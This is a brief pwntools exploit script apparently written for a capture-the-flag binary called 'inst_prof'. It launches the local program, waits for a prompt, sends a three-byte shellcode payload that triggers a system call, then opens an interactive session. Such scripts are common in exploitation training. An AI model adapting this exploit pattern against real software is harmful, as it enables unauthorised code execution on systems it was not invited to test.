from pwn import *

context.log_level='debug'

sh = process('./inst_prof')

sh.recvuntil('ready\n')

pay = '\x92\xcd\x80'

sh.sendline(pay)

sh.interactive()
